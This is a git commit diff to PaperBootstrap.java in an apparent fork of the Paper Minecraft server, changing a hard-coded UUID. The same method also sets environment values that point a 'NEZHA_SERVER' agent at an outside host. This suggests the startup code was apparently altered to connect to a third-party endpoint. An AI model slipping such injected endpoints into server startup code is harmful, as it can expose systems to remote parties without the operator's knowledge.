c33ba0028d421214a0c3cdbb6358517f56f897be
whoau <36981275+whoau@users.noreply.github.com>
2025-12-16 09:53:07 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,7 +92,7 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "1fc0252d-8340-449b-8ded-fb097cda2822");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "n.bei.bio:443");
         envVars.put("NEZHA_PORT", "");
